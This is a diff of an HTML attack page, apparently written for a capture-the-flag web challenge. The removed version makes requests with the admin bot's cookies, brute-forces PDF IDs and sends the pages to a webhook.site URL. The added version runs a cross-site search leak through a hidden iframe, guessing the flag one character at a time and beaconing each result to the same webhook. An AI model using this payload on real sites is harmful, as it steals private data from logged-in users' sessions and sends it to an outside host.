@@ -1,65 +1,77 @@
 <!DOCTYPE html>
-
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>payload</title>
+<meta charset="utf-8">
+<title>.</title>
 </head>
 <body>
 <script>
-const WEBHOOK = "https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c";
+const WEBHOOK = 'https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c';
+const TARGET  = 'https://wonder.cbd2026.cloud';
 
-// kirim data ke webhook
-function exfil(tag, data) {
-try {
-fetch(WEBHOOK + "?tag=" + encodeURIComponent(tag) + "&d=" + btoa(data));
-} catch(e) {}
+function exfil(data) {
+  const url = WEBHOOK + '?' + new URLSearchParams(data).toString();
+  // three methods for reliability
+  navigator.sendBeacon(url);
+  new Image().src = url;
+  fetch(url, { mode: 'no-cors' }).catch(() => {});
 }
 
-// ambil halaman dengan cookie admin (bot)
-async function grab(path) {
-try {
-const res = await fetch(path, {
-method: "GET",
-credentials: "include"
-});
-
-```
-const text = await res.text();
-exfil(path, text);
-```
-
-} catch(e) {}
+function getParam(k) {
+  return new URLSearchParams(location.search).get(k) || '';
 }
 
-async function run() {
+const guess = getParam('g');   // e.g. FLAG{a
+const idx   = getParam('i');   // char index for logging
 
-// test basic
-await grab("/");
-await grab("/search?q=");
+if (!guess) {
+  document.body.innerText = 'missing ?g= param';
+} else {
+  exfil({ status: 'loading', guess, idx });
 
-// brute PDF ID (TARGET UTAMA)
-for (let i = 1; i <= 100; i++) {
-await grab("/pdfs/" + i);
+  const iframe = document.createElement('iframe');
+  iframe.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;';
+  iframe.src = TARGET + '/search?q=' + encodeURIComponent(guess);
+
+  iframe.onload = function() {
+    let size = 0;
+    let html = '';
+    try {
+      html = iframe.contentDocument.documentElement.innerHTML;
+      size = html.length;
+    } catch(e) {
+      // same-origin policy blocked — shouldn't happen since target is same origin as bot session
+      exfil({ status: 'cors_blocked', guess, idx, err: e.message });
+      return;
+    }
+
+    // Count <article class="pdf-card"> occurrences
+    // 1 match = only our decoy = wrong char
+    // 2 matches = decoy + admin private PDF = CORRECT char
+    const cards = (html.match(/pdf-card/g) || []).length;
+
+    // Also grab the page size as a secondary signal
+    exfil({
+      status: 'done',
+      guess,
+      idx,
+      cards,
+      size,
+      hit: cards >= 2 ? '1' : '0'
+    });
+  };
+
+  iframe.onerror = function() {
+    exfil({ status: 'iframe_error', guess, idx });
+  };
+
+  document.body.appendChild(iframe);
+
+  // Fallback timeout exfil
+  setTimeout(() => {
+    exfil({ status: 'timeout', guess, idx });
+  }, 8000);
 }
-
-// coba raw file
-for (let i = 1; i <= 100; i++) {
-await grab("/pdfs/" + i + "/raw");
-}
-
-// alternatif path
-for (let i = 1; i <= 100; i++) {
-await grab("/index.php/pdfs/" + i);
-}
-
-// endpoint tambahan
-await grab("/dashboard");
-await grab("/profile");
-await grab("/admin");
-}
-
-run(); </script>
-
+</script>
 </body>
 </html>
